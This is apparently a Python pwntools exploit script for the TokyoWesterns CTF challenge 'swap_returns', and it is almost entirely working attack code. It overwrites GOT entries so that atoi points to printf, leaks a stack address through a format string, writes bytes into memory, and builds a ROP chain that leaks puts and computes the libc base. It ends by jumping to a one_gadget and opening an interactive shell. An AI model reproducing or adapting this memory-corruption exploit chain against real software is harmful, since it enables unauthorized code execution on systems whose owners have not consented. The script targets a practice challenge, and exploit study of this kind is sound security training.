from pwn import *

local=1
pc='/tmp/pwn/swap_returns_debug'
remote_addr="swap.chal.ctf.westerns.tokyo"
remote_port=37567
aslr=False

libc=ELF('./libc.so.6')
#libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
#libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')
#context.log_level=True

if local==1:
    p = process(pc,aslr=aslr,env={'LD_PRELOAD': './libc.so.6'})
    gdb.attach(p,'c')
else:
    p=remote(remote_addr,remote_port)

ru = lambda x : p.recvuntil(x)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x) 
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)

def lg(s,addr):
    print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def raddr(a=6):
    if(a==0):
        return u64(rv(a).ljust(8,'\x00'))
    else:
        return u64(rl().strip('\n').ljust(8,'\x00'))

def set_addr(addr1,addr2):
    sla("choice:",'1')
    sla("address:",str(addr1))
    sla("address:",str(addr2))

def sw():
    sla("choice:",'2')

fuck=0x601500
save=0x601700
zero=0x601800

def make_byte(bt):
    global fuck
    global save
    global zero
    i=0
    for k in range(len(bt)):
        byte=u8(bt[i])
        set_addr(fuck+byte,stack_addr)
        sw()
        set_addr(fuck+byte+1,zero)
        sw() 
        set_addr(fuck+byte,save+i)
        sw() 
        i+=1
        zero+=8

if __name__ == '__main__':
    sla("choice:",'9')
    rl()
    atoi=0x601050
    printf=0x0601038
    stack_check_failed=0x601030
    setvbuf=0x601048
    bss=0x601100
    set_addr(atoi,printf)
    sw()
    sa("choice:",'%x')
    rv(8)
    stack_addr=int('7fff'+rv(8),16)-6+0x30
    lg('stack_addr',stack_addr)
    sa("choice:",'a\x00')
    sla("address:",str(atoi))
    sla("address:",str(printf))
    sa("choice:",'aa')
    set_addr(bss,setvbuf)
    sw()
    set_addr(bss+0x100,stack_check_failed)
    sw()
    make_byte(p16(0x6ff0))
    set_addr(bss-6,save-6)
    sw()
    make_byte(p16(0x8e8))
    set_addr(bss+0x100-6,save-6)
    sw()
    set_addr(bss+0x100,stack_check_failed)
    sw()
    puts_plt=0x4006A0
    poprdiret=0x0400a53
    puts_got=0x601028
    poprbpret=0x0000000000400760
    leaveret=0x4008E7
    payload='A'*22+p64(poprbpret)+p64(save-8)+p64(leaveret)
    payload2=p64(poprdiret)+p64(puts_got)+p64(puts_plt)+p64(0x40088E)
    make_byte(payload2)
    set_addr(bss,atoi)
    sw()
    sla("choice:",payload)
    ru(": \n")
    puts_addr=raddr(6)
    lg("puts addr",puts_addr)
    libc.address=puts_addr-libc.symbols['puts']
    one_shot=libc.address+0x4557a
    sl(cyclic(20)+p64(one_shot))

    p.interactive()
